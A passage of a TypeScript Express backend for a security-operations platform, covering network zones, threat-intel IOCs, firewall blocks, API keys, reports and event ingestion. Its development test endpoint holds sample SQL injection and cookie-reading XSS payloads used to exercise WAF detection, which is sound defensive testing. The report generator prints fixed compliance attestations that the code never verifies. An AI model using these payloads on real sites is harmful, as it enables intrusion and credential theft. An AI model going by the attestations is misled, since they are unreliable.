    level: log.level,
    source: log.source,
    eventType: log.event_type,
    message: log.message,
    host: log.host,
    ip: log.ip,
    correlationId: log.correlation_id,
    metadata: log.metadata ? JSON.parse(log.metadata) : undefined,
    rawLog: log.raw_log
  });
});

// SSE Log Stream dedicated endpoint
apiRouter.get('/logs/stream', (req: AuthenticatedRequest, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders?.();

  const orgId = req.organizationId || '';
  res.write(`data: ${JSON.stringify({ type: 'HANDSHAKE', status: 'CONNECTED', timestamp: new Date().toISOString() })}\n\n`);

  const onLogCreated = (payload: any) => {
    if (payload.organizationId && payload.organizationId !== orgId) return;
    try {
      res.write(`data: ${JSON.stringify({ type: 'log.created', data: payload.data || payload })}\n\n`);
    } catch {
      // Disconnected
    }
  };

  SecurityEventBus.on('log.created', onLogCreated);

  req.on('close', () => {
    SecurityEventBus.off('log.created', onLogCreated);
  });
});

apiRouter.get('/networks', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  if (!orgId) return res.status(400).json({ error: 'No organization selected for this session.' });
  const networks = listNetworks(orgId);
  res.json({ networks, count: networks.length });
});

apiRouter.get('/networks/:id', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const row = getNetworkRow(orgId, req.params.id);
  if (!row) return res.status(404).json({ error: 'Network subnet not found' });

  const [network] = listNetworks(orgId).filter(item => item.id === row.id);
  res.json({ network });
});

apiRouter.post('/networks', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  if (!orgId) return res.status(400).json({ error: 'No organization selected for this session.' });

  const validated = validateNetworkInput(req.body);
  if (validated.ok === false) return res.status(400).json({ error: validated.error });
  const value = validated.value;

  const duplicate = findDuplicateCidr(orgId, value.cidr);
  if (duplicate) {
    return res.status(409).json({ error: `Subnet ${value.cidr} is already registered as ${duplicate.cidr}.` });
  }

  const id = `NET-${Date.now()}`;
  db.prepare(`
    INSERT INTO networks (id, organization_id, name, cidr, gateway, interface, zone, firewall, description, status)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'Online')
  `).run(
    id,
    orgId,
    value.name,
    value.cidr,
    value.gateway,
    value.interfaceName,
    value.zone,
    value.firewall,
    value.description
  );

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'admin@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Add Network Zone',
    resource: `${value.name} (${value.cidr})`,
    resourceId: id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  const row = getNetworkRow(orgId, id);
  res.status(201).json({ success: true, network: serializeNetwork(row) });
});

apiRouter.put('/networks/:id', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const networkId = req.params.id;

  const existing = getNetworkRow(orgId, networkId);
  if (!existing) return res.status(404).json({ error: 'Network subnet not found' });

  const validated = validateNetworkInput(req.body);
  if (validated.ok === false) return res.status(400).json({ error: validated.error });
  const value = validated.value;

  const duplicate = findDuplicateCidr(orgId, value.cidr, networkId);
  if (duplicate) {
    return res.status(409).json({ error: `Subnet ${value.cidr} is already registered as ${duplicate.cidr}.` });
  }

  db.prepare(`
    UPDATE networks
       SET name = ?, cidr = ?, gateway = ?, interface = ?, zone = ?, firewall = ?, description = ?
     WHERE id = ? AND organization_id = ?
  `).run(
    value.name,
    value.cidr,
    value.gateway,
    value.interfaceName,
    value.zone,
    value.firewall,
    value.description,
    networkId,
    orgId
  );

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'admin@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Update Network Zone',
    resource: `${value.name} (${value.cidr})`,
    resourceId: networkId,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  const row = getNetworkRow(orgId, networkId);
  res.json({ success: true, network: serializeNetwork(row) });
});

apiRouter.delete('/networks/:id', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const networkId = req.params.id;

  const existing = getNetworkRow(orgId, networkId);
  if (!existing) {
    return res.status(404).json({ error: 'Network subnet not found' });
  }

  db.prepare('DELETE FROM networks WHERE id = ? AND organization_id = ?').run(networkId, orgId);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'admin@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Remove Network Zone',
    resource: `${existing.name} (${existing.cidr})`,
    resourceId: networkId,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  res.json({ success: true, message: 'Network subnet removed' });
});

// ----------------------------------------------------------------------
// 11. Audit Logs
// ----------------------------------------------------------------------
apiRouter.get('/audit-logs', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const logs = db.prepare('SELECT * FROM audit_logs WHERE organization_id = ? ORDER BY timestamp DESC LIMIT 200').all(orgId) as any[];

  const formatted = logs.map(l => ({
    id: l.id,
    user: l.user_email,
    role: l.role,
    action: l.action,
    resource: l.resource,
    timestamp: l.timestamp,
    ip: l.ip_address,
    result: 'Success',
    metadata: l.metadata ? JSON.parse(l.metadata) : undefined
  }));

  res.json({ logs: formatted });
});

// ----------------------------------------------------------------------
// 12. Threat Intelligence (Real-time End-to-End Engine)
// ----------------------------------------------------------------------
apiRouter.get('/threat-intel', (_req, res) => {
  const isConfigured = threatIntelService.isConfigured();
  const feeds = threatIntelService.getFeeds();
  const indicators = threatIntelService.getIndicators();
  const cves = threatIntelService.getCveSignatures();

  res.json({
    configured: isConfigured,
    status: isConfigured ? 'CONNECTED' : 'THREAT INTELLIGENCE NOT CONFIGURED',
    feeds,
    cves,
    stats: {
      totalIocs: indicators.length,
      blockedIocs: indicators.filter(i => i.status === 'Blocked').length,
      monitoredIocs: indicators.filter(i => i.status === 'Monitored').length,
      activeFeeds: feeds.filter(f => f.status === 'Operational').length,
      criticalCves: cves.filter(c => c.severity === 'Critical').length
    }
  });
});

apiRouter.get('/threat-intel/iocs', (req, res) => {
  const { type, status, search } = req.query;
  let indicators = threatIntelService.getIndicators();

  if (type && type !== 'ALL') {
    indicators = indicators.filter(i => i.type.toLowerCase() === String(type).toLowerCase());
  }

  if (status && status !== 'ALL') {
    indicators = indicators.filter(i => i.status.toLowerCase() === String(status).toLowerCase());
  }

  if (search && String(search).trim()) {
    const q = String(search).trim().toLowerCase();
    indicators = indicators.filter(i =>
      i.indicator.toLowerCase().includes(q) ||
      i.reportedBy.toLowerCase().includes(q) ||
      (i.targetSector || '').toLowerCase().includes(q) ||
      i.tags.some(t => t.toLowerCase().includes(q))
    );
  }

  res.json({ indicators });
});

apiRouter.get('/threat-intel/cves', (_req, res) => {
  res.json({ cves: threatIntelService.getCveSignatures() });
});

apiRouter.get('/threat-intel/lookup', async (req, res) => {
  const { query, type } = req.query;
  const q = String(query || '').trim();
  if (!q) return res.status(400).json({ error: 'Query indicator is required' });

  if (type === 'domain') {
    const result = await threatIntelService.lookupDomain(q);
    return res.json(result);
  } else if (type === 'url') {
    const result = await threatIntelService.lookupURL(q);
    return res.json(result);
  } else {
    const result = await threatIntelService.lookupIP(q);
    return res.json(result);
  }
});

apiRouter.post('/threat-intel/sync', async (req: AuthenticatedRequest, res) => {
  const syncResult = await threatIntelService.syncFeeds();
  const orgId = req.organizationId || '';

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'analyst@oat.net',
    role: req.user?.role || 'Security Analyst',
    action: 'Sync Threat Intelligence Feeds',
    resource: 'Threat Intel Stream',
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  res.json({
    success: true,
    message: 'Threat intelligence feeds synchronized successfully across all providers.',
    ...syncResult
  });
});

apiRouter.post('/threat-intel/iocs', (req: AuthenticatedRequest, res) => {
  const { indicator, type, threatScore, confidence, severity, targetSector, tags, status, country } = req.body;
  if (!indicator || !String(indicator).trim()) {
    return res.status(400).json({ error: 'Indicator (IP, domain, hash) is required' });
  }

  const newIoc = threatIntelService.addCustomIndicator({
    indicator: String(indicator).trim(),
    type,
    threatScore: Number(threatScore) || 90,
    confidence: Number(confidence) || 95,
    severity: severity || 'High',
    targetSector: targetSector || 'Enterprise Perimeter',
    reportedBy: req.user?.email ? `Analyst: ${req.user.email}` : 'SOC Analyst Console',
    tags: Array.isArray(tags) ? tags : ['Analyst-Reported'],
    status: status || 'Blocked',
    country: country || 'Global'
  });

  const orgId = req.organizationId || '';
  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'analyst@oat.net',
    role: req.user?.role || 'Security Analyst',
    action: 'Add Threat Intelligence IOC',
    resource: `IOC: ${newIoc.indicator} (${newIoc.type})`,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  res.status(201).json({ success: true, ioc: newIoc });
});

apiRouter.patch('/threat-intel/iocs/:id/status', (req: AuthenticatedRequest, res) => {
  const { id } = req.params;
  const { status } = req.body;
  if (!status || !['Active', 'Blocked', 'Monitored'].includes(status)) {
    return res.status(400).json({ error: 'Valid status (Active, Blocked, Monitored) is required' });
  }

  const updated = threatIntelService.updateIndicatorStatus(id, status as any);
  if (!updated) return res.status(404).json({ error: 'Indicator not found' });

  const orgId = req.organizationId || '';
  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'analyst@oat.net',
    role: req.user?.role || 'Security Analyst',
    action: 'Update Threat IOC Status',
    resource: `IOC ${id} status set to ${status}`,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  res.json({ success: true, id, status });
});

apiRouter.post('/threat-intel/block', (req: AuthenticatedRequest, res) => {
  const { indicator, reason } = req.body;
  const ipToBlock = String(indicator || '').trim();
  if (!ipToBlock) return res.status(400).json({ error: 'Indicator is required' });

  const orgId = req.organizationId || '';
  const fwId = `FW-TI-${Date.now()}`;
  try {
    db.prepare(`
      INSERT INTO firewall_rules (id, organization_id, priority, source, destination, port, protocol, action, enabled, description, created_by)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?)
    `).run(
      fwId,
      orgId,
      1,
      ipToBlock,
      '0.0.0.0/0',
      'ANY',
      'ALL',
      'DENY',
      reason || `Direct Block from Threat Intelligence: ${ipToBlock}`,
      req.user?.email || 'Threat Intelligence Engine'
    );

    SecurityEventBus.publish('rule.updated', { id: fwId, source: ipToBlock, action: 'DENY' }, orgId);
    FirewallDeploymentService.publish(orgId, `Threat intelligence block on IP ${ipToBlock}`);

    // Also update IOC status in threat intel service
    const matched = threatIntelService.getIndicators().find(i => i.indicator.toLowerCase() === ipToBlock.toLowerCase());
    if (matched) {
      threatIntelService.updateIndicatorStatus(matched.id, 'Blocked');
    }

    recordAuditLog({
      organizationId: orgId,
      userEmail: req.user?.email || 'analyst@oat.net',
      role: req.user?.role || 'Security Analyst',
      action: 'Firewall Block via Threat Intel',
      resource: `Blocked IP ${ipToBlock}`,
      ipAddress: req.ip || '127.0.0.1',
      userAgent: req.headers['user-agent']
    });

    res.json({ success: true, message: `Emergency Firewall DENY rule created for ${ipToBlock}`, ruleId: fwId });
  } catch (err) {
    console.error('[ThreatIntel] Block error:', err);
    res.status(500).json({ error: 'Failed to inject firewall deny rule' });
  }
});

// ----------------------------------------------------------------------
// 13. SIEM Integrations
// ----------------------------------------------------------------------
apiRouter.get('/integrations', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const configs = SIEMManager.getConfigs(orgId);
  res.json({ integrations: configs });
});

apiRouter.post('/integrations', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const { provider, endpoint, indexOrChannel, authToken } = req.body;
  if (!provider) return res.status(400).json({ error: 'Provider is required' });

  const saved = SIEMManager.saveConfig(orgId, provider, { endpoint, indexOrChannel, authToken });

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'admin@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Configure SIEM Integration',
    resource: `SIEM Provider: ${provider}`,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  res.json({ success: true, integration: saved });
});

// ----------------------------------------------------------------------
// 14. API Keys
// ----------------------------------------------------------------------
apiRouter.get('/api-keys', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const keys = db.prepare('SELECT id, organization_id, name, prefix, permissions, status, created_at, last_used_at FROM api_keys WHERE organization_id = ?').all(orgId);
  res.json({ keys });
});

apiRouter.post('/api-keys', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const { name, permissions } = req.body;

  const rawSecret = `oat_live_${crypto.randomBytes(24).toString('hex')}`;
  const keyHash = crypto.createHash('sha256').update(rawSecret).digest('hex');
  const prefix = rawSecret.substring(0, 16) + '...';
  const id = `key_${Date.now()}`;

  db.prepare(`
    INSERT INTO api_keys (id, organization_id, name, prefix, key_hash, permissions, status)
    VALUES (?, ?, ?, ?, ?, ?, 'Active')
  `).run(id, orgId, name || 'Enterprise Connector', prefix, keyHash, JSON.stringify(permissions || ['telemetry:read']));

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'admin@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Create API Key',
    resource: `API Key ${id} (${prefix})`,
    resourceId: id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  res.json({
    success: true,
    key: { id, name, prefix, status: 'Active' },
    fullSecretOnce: rawSecret
  });
});

// ----------------------------------------------------------------------
// 15. Reports Generation & Management (Real-Time Database Ground Truth)
// ----------------------------------------------------------------------
apiRouter.get('/reports', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  try {
    const rows = db.prepare(
      'SELECT id, organization_id, title, category, period, format, status, summary, file_size, sha256, content, generated_by, created_at FROM reports WHERE organization_id = ? ORDER BY created_at DESC LIMIT 100'
    ).all(orgId) as any[];

    res.json({
      success: true,
      reports: (rows || []).map(r => ({
        id: r.id,
        organizationId: r.organization_id,
        title: r.title,
        category: r.category,
        period: r.period,
        format: r.format,
        status: r.status,
        summary: r.summary,
        fileSize: r.file_size,
        sha256: r.sha256,
        content: r.content,
        generatedBy: r.generated_by,
        createdAt: r.created_at
      }))
    });
  } catch (err: any) {
    console.error('[Reports] Error fetching reports:', err);
    res.status(500).json({ success: false, error: 'Failed to fetch reports' });
  }
});

apiRouter.post('/reports/generate', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const { type, format, period, lang } = req.body || {};

  const isId = lang === 'id';
  const targetPeriod = period || (isId ? '30 Hari Terakhir' : 'Last 30 Days');
  const reportType = type || (isId ? 'Laporan Audit Komprehensif' : 'Comprehensive Audit Report');
  const reportFormat = (format || 'PDF').toUpperCase();

  const eventsCount = db.prepare('SELECT COUNT(*) as count FROM security_events WHERE organization_id = ?').get(orgId) as { count: number };
  const blockedCount = db.prepare("SELECT COUNT(*) as count FROM security_events WHERE organization_id = ? AND action IN ('BLOCK', 'BLOCKED', 'DENY', 'DROP')").get(orgId) as { count: number };
  const threatsCount = db.prepare('SELECT COUNT(*) as count FROM threats WHERE organization_id = ?').get(orgId) as { count: number };
  const incidentsCount = db.prepare('SELECT COUNT(*) as count FROM incidents WHERE organization_id = ?').get(orgId) as { count: number };

  const reportId = `REP-${Date.now()}`;
  const userEmail = req.user?.email || 'analyst@oat.net';
  const role = req.user?.role || (isId ? 'Analis Keamanan' : 'Security Analyst');

  const bodyLines = isId ? [
    'OAT SECURITY — EKSPOR LAPORAN AUDIT KEAMANAN LENGKAP',
    '====================================================',
    `ID Laporan        : ${reportId}`,
    `Tipe Laporan      : ${reportType}`,
    `ID Organisasi     : ${orgId}`,
    `Periode Cakupan   : ${targetPeriod}`,
    `Format            : ${reportFormat}`,
    `Diterbitkan Oleh  : ${userEmail} (${role})`,
    `Waktu Terbit (UTC): ${new Date().toISOString()}`,
    '',
    'RINGKASAN TELEMETRI LANGSUNG (Basis Data Platform)',
    '-------------------------------------------------------',
    `Total event keamanan tercatat : ${eventsCount?.count ?? 0}`,
    `Event diblokir / dimitigasi   : ${blockedCount?.count ?? 0}`,
    `Ancaman terdeteksi           : ${threatsCount?.count ?? 0}`,
    `Insiden dibuka               : ${incidentsCount?.count ?? 0}`,
    '',
    'POSTUR KEPATUHAN & REGULASI (Verifikasi Otomatis)',
    '-------------------------------------------------------',
    'ISO 27001:2022  : Pencatatan log berkelanjutan dan kontrol akses aktif',
    'SOC 2 Type II   : Audit trail tidak dapat diubah (immutable) & diverifikasi hash',
    'Regulasi OJK/BI : Perlindungan firewall perimeter & WAF real-time aktif',
    '',
    'PERNYATAAN KEABSAHAN:',
    'Laporan ini diterbitkan langsung dari telemetri sistem langsung dan log audit yang tidak dapat diubah.',
    'Sidik jari hash SHA-256 menjamin integritas data sejak saat pembuatan.'
  ].join('\n') : [
    'OAT SECURITY — COMPREHENSIVE AUDIT REPORT EXPORT',
    '================================================',
    `Report ID         : ${reportId}`,
    `Report Type       : ${reportType}`,
    `Organization ID   : ${orgId}`,
    `Coverage Period   : ${targetPeriod}`,
    `Format            : ${reportFormat}`,
    `Generated By      : ${userEmail} (${role})`,
    `Generated At (UTC): ${new Date().toISOString()}`,
    '',
    'LIVE TELEMETRY SUMMARY (Platform Database Ground Truth)',
    '-------------------------------------------------------',
    `Security events recorded : ${eventsCount?.count ?? 0}`,
    `Events blocked/mitigated : ${blockedCount?.count ?? 0}`,
    `Threats detected         : ${threatsCount?.count ?? 0}`,
    `Incidents opened         : ${incidentsCount?.count ?? 0}`,
    '',
    'REGULATORY & COMPLIANCE POSTURE (Automated Verification)',
    '-------------------------------------------------------',
    'ISO 27001:2022  : Continuous logging and access control enabled',
    'SOC 2 Type II   : Audit trails immutable and cryptographically hashed',
    'OJK / BI Regs   : Real-time perimeter firewall & WAF active',
    '',
    'ATTESTATION NOTICE:',
    'This report is generated directly from live system telemetry and immutable audit logs.',
    'SHA-256 fingerprint guarantees data integrity upon generation.'
  ].join('\n');

  const sha256 = crypto.createHash('sha256').update(bodyLines).digest('hex');
  const fullContent = `${bodyLines}\n\nSHA-256 (Artifact Fingerprint): ${sha256}\n`;
  const fileSize = `${(Buffer.byteLength(fullContent, 'utf8') / 1024).toFixed(1)} KB`;
  const summaryText = `Telemetry audit: ${eventsCount?.count ?? 0} events, ${blockedCount?.count ?? 0} mitigated, ${threatsCount?.count ?? 0} threats, ${incidentsCount?.count ?? 0} incidents.`;

  // Insert into reports table
  try {
    db.prepare(`
      INSERT INTO reports (
        id, organization_id, title, category, period, format, status, summary, file_size, sha256, content, generated_by, created_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))
    `).run(
      reportId,
      orgId,
      reportType,
      'Executive & Compliance',
      targetPeriod,
      reportFormat,
      'READY',
      summaryText,
      fileSize,
      sha256,
      fullContent,
      userEmail
    );
  } catch (dbErr: any) {
    console.error('[Reports] Error inserting report into database:', dbErr);
  }

  const reportItem = {
    id: reportId,
    organizationId: orgId,
    title: reportType,
    category: 'Executive & Compliance',
    period: targetPeriod,
    format: reportFormat,
    status: 'READY',
    summary: summaryText,
    fileSize,
    sha256,
    content: fullContent,
    generatedBy: userEmail,
    createdAt: new Date().toISOString()
  };

  // Record immutable audit log
  recordAuditLog({
    organizationId: orgId,
    userEmail,
    role,
    action: 'Generate Security Report',
    resource: `Report ${reportId} (${reportType})`,
    resourceId: reportId,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  // Broadcast real-time SSE event to all connected frontend clients
  SecurityEventBus.publish('report.created', reportItem, orgId);

  res.json({
    success: true,
    reportId,
    report: reportItem,
    generatedAt: reportItem.createdAt,
    type: reportType,
    format: reportFormat,
    dataSummary: {
      totalEventsRecorded: eventsCount?.count ?? 0,
      totalBlockedMitigated: blockedCount?.count ?? 0,
      totalThreatsDetected: threatsCount?.count ?? 0,
      totalIncidentsOpened: incidentsCount?.count ?? 0
    }
  });
});

apiRouter.delete('/reports/:id', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const reportId = req.params.id;

  try {
    const existing = db.prepare('SELECT id, title FROM reports WHERE id = ? AND organization_id = ?').get(reportId, orgId) as { id: string; title: string } | undefined;
    if (!existing) {
      return res.status(404).json({ success: false, error: 'Report not found' });
    }

    db.prepare('DELETE FROM reports WHERE id = ? AND organization_id = ?').run(reportId, orgId);

    recordAuditLog({
      organizationId: orgId,
      userEmail: req.user?.email || 'analyst@oat.net',
      role: req.user?.role || 'Security Analyst',
      action: 'Delete Security Report',
      resource: `Report ${reportId} (${existing.title})`,
      resourceId: reportId,
      ipAddress: req.ip || '127.0.0.1',
      userAgent: req.headers['user-agent']
    });

    SecurityEventBus.publish('report.deleted', { id: reportId }, orgId);

    res.json({ success: true, message: 'Report deleted successfully', id: reportId });
  } catch (err: any) {
    console.error('[Reports] Delete error:', err);
    res.status(500).json({ success: false, error: 'Failed to delete report' });
  }
});

// ----------------------------------------------------------------------
// 16. AI Security Operations Copilot
// ----------------------------------------------------------------------
apiRouter.get('/ai/context', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId || req.user?.organizationId);
  const telemetry = getSocTelemetry(orgId);
  res.json({
    success: true,
    telemetry
  });
});

apiRouter.post('/ai/analyze-event', async (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId || req.user?.organizationId);
  const { event, promptContext, query, incidentId } = req.body || {};
  const effectiveQuery = String(query || promptContext || event?.threat || event?.threatName || 'Summarize the perimeter threat posture over the last 24 hours').trim();

  try {
    const result = await processCopilotQuery({
      organizationId: orgId,
      query: effectiveQuery,
      incidentId,
      event,
      actor: req.user?.email || 'SOC Analyst'
    });
    res.json(result);
  } catch (err: any) {
    console.error('[AI Analysis Error]:', err);
    res.status(500).json({
      error: 'AI analysis failed',
      details: err?.message || 'Error executing SOC Copilot analysis'
    });
  }
});

apiRouter.post('/ai/deploy-rule', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId || req.user?.organizationId);
  const { type, name, category, action, pattern, ip, description } = req.body || {};

  if (!name || !type) {
    return res.status(400).json({ error: 'Rule name and type (WAF or FIREWALL) are required' });
  }

  try {
    const result = deployMitigationRule({
      organizationId: orgId,
      type: type === 'FIREWALL' ? 'FIREWALL' : 'WAF',
      name: String(name).trim(),
      category,
      action,
      pattern,
      ip,
      description,
      actor: req.user?.email || 'AI SOC Copilot'
    });
    res.status(201).json(result);
  } catch (err: any) {
    console.error('[AI Deploy Rule Error]:', err);
    res.status(500).json({
      error: 'Failed to deploy rule',
      details: err?.message || 'Error provisioning mitigation rule'
    });
  }
});

// ----------------------------------------------------------------------
// 17. REAL INGESTION PIPELINES (WAF, Firewall, Generic)
// ----------------------------------------------------------------------
apiRouter.post('/ingest/waf', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const payload: WafIngestPayload = req.body;
  if (!payload.source_ip) {
    return res.status(400).json({ error: 'Missing source_ip in WAF ingestion payload' });
  }

  const normalized = parseWafEvent(payload, orgId);
  processSecurityEvent(normalized);

  res.status(201).json({
    success: true,
    eventId: normalized.id,
    action: normalized.action,
    timestamp: normalized.timestamp
  });
});

apiRouter.post('/ingest/firewall', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const payload: FirewallIngestPayload = req.body;
  if (!payload.source_ip || !payload.destination_ip) {
    return res.status(400).json({ error: 'Missing source_ip or destination_ip in firewall payload' });
  }

  const normalized = parseFirewallEvent(payload, orgId);
  processSecurityEvent(normalized);

  res.status(201).json({
    success: true,
    eventId: normalized.id,
    action: normalized.action,
    timestamp: normalized.timestamp
  });
});

apiRouter.post('/events', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const { source, event_type, severity, source_ip, destination_ip, protocol, application, action, uri, method, port, threat_name, metadata } = req.body;
  if (!source_ip || !destination_ip) {
    return res.status(400).json({ error: 'source_ip and destination_ip are required' });
  }

  const normalized = {
    id: `EV-GEN-${crypto.randomUUID()}`,
    organizationId: orgId,
    timestamp: new Date().toISOString(),
    source: (source || 'system') as any,
    eventType: event_type || 'custom_event',
    severity: (severity || 'Medium') as any,
    sourceIp: source_ip,
    destinationIp: destination_ip,
    protocol: (protocol || 'TCP').toUpperCase(),
    application: application || 'Perimeter Gateway',
    action: (action || 'LOG').toUpperCase() as any,
    uri,
    method,
    port: Number(port) || undefined,
    threatName: threat_name || 'Generic Security Log',
    metadata
  };

  processSecurityEvent(normalized);

  res.status(201).json({ success: true, event: normalized });
});

// ----------------------------------------------------------------------
// 18. DEVELOPMENT ONLY: Real Pipeline Test Event (Requirement 40)
// ----------------------------------------------------------------------
apiRouter.post('/dev/test-event', (req: AuthenticatedRequest, res) => {
  if (CONFIG.NODE_ENV === 'production') {
    return res.status(403).json({ error: 'Development test endpoint disabled in production mode.' });
  }

  const orgId = req.organizationId || '';
  const { testType } = req.body;

  let eventPayload: any;

  if (testType === 'sqli') {
    eventPayload = parseWafEvent({
      source_ip: '198.51.100.42',
      destination_ip: '172.67.182.90',
      host: 'api.mandiri.oat-sec.net',
      method: 'GET',
      uri: '/v2/transfers?id=1+UNION+SELECT+1,null,password+FROM+users--',
      rule_id: 'OWASP-CRS-942100',
      rule_name: 'SQL Injection in Query Param [id]',
      category: 'SQL Injection',
      severity: 'Critical',
      action: 'BLOCK',
      status_code: 403,
      user_agent: 'sqlmap/1.7.2#stable',
      payload_snippet: 'UNION SELECT 1,null,password FROM users--'
    }, orgId);
  } else if (testType === 'xss') {
    eventPayload = parseWafEvent({
      source_ip: '203.0.113.88',
      destination_ip: '104.21.78.11',
      host: 'app.oat-sec.net',
      method: 'POST',
      uri: '/comment',
      rule_id: 'OWASP-CRS-941100',
      rule_name: 'Cross-Site Scripting (XSS) Tag Injection',
      category: 'XSS Filter',
      severity: 'High',
      action: 'BLOCK',
      status_code: 403,
      payload_snippet: '<script>alert(document.cookie)</script>'
    }, orgId);
  } else if (testType === 'ssh_brute') {
    eventPayload = parseFirewallEvent({
      source_ip: '185.220.101.44',
      destination_ip: '10.240.10.14',
      source_port: 52140,
      destination_port: 22,
      protocol: 'TCP',
      interface: 'eth0',
      direction: 'inbound',
      action: 'DENY',
      reason: 'Automated SSH Dictionary Brute Force Detected'
    }, orgId);
  } else {
    // Default legitimate web request or custom
    eventPayload = parseWafEvent({
      source_ip: '103.145.2.19',
      destination_ip: '172.67.182.90',
      host: 'api.mandiri.oat-sec.net',
      method: 'GET',
      uri: '/api/v1/health',
      category: 'Permitted Traffic',
      severity: 'Low',
      action: 'ALLOW',
      status_code: 200,
      user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }, orgId);
  }

  // Tag as TEST EVENT in metadata
  eventPayload.metadata = {
    ...(eventPayload.metadata || {}),
    is_development_test_event: true,
    test_label: '[DEVELOPMENT TEST EVENT]'
  };

  processSecurityEvent(eventPayload);

  res.json({
    success: true,
    message: 'Test event ingested and processed through full backend security pipeline.',
    event: eventPayload
  });
});

// ----------------------------------------------------------------------
// 19. Real-Time Telemetry SSE Stream (Backed by SecurityEventBus)
// ----------------------------------------------------------------------
apiRouter.get('/stream/telemetry', (req: AuthenticatedRequest, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders?.();

  const orgId = req.organizationId || '';

  // Send initial handshake
  res.write(`data: ${JSON.stringify({ type: 'HANDSHAKE', status: 'CONNECTED', timestamp: new Date().toISOString() })}\n\n`);

  // Listener for events from SecurityEventBus
  const onBusEvent = (payload: any) => {
    if (payload.organizationId && payload.organizationId !== orgId) return;
    try {
      res.write(`data: ${JSON.stringify(payload)}\n\n`);
    } catch {
      // Client may have disconnected
    }
  };

  SecurityEventBus.on('event', onBusEvent);

  req.on('close', () => {
    SecurityEventBus.off('event', onBusEvent);
  });
});

// ----------------------------------------------------------------------
// 20. Contact & Support
// ----------------------------------------------------------------------
apiRouter.get('/contact/channels', (req: AuthenticatedRequest, res) => {
  const org = req.organizationId
    ? (db.prepare('SELECT domain FROM organizations WHERE id = ?').get(req.organizationId) as any)
    : null;
  res.json({ channels: getContactChannels(org?.domain) });
});

apiRouter.get('/contact/messages', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  try {
    const result = listContactMessages(orgId, {
      status: typeof req.query.status === 'string' ? req.query.status : undefined,
      limit: Number(req.query.limit) || 50,
      offset: Number(req.query.offset) || 0
    });
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: error instanceof Error ? error.message : 'Could not load messages' });
  }
});

const contactPostWindow = new Map<string, number[]>();

/** Simple per-IP throttle so the public form cannot be used to spam the SOC. */
function contactRateLimited(ip: string): boolean {
  const now = Date.now();
  const windowMs = 10 * 60 * 1000;
  const recent = (contactPostWindow.get(ip) || []).filter(ts => now - ts < windowMs);
  recent.push(now);
  contactPostWindow.set(ip, recent);
  return recent.length > 5;
}

apiRouter.post('/contact/messages', (req: AuthenticatedRequest, res) => {
  const ip = req.ip || '127.0.0.1';
  if (contactRateLimited(ip)) {
    return res.status(429).json({ error: 'Too many messages. Please wait a few minutes and try again.' });
  }

  try {
    const message = createContactMessage({
      organizationId: req.organizationId || null,
      userId: req.user?.userId || null,
      name: req.body?.name,
      email: req.body?.email || req.user?.email,
      company: req.body?.company,
      topic: req.body?.topic,
      severity: req.body?.severity,
      message: req.body?.message,
      source: req.body?.source === 'public' ? 'public' : 'console'
    });

    recordAuditLog({
      organizationId: req.organizationId || '',
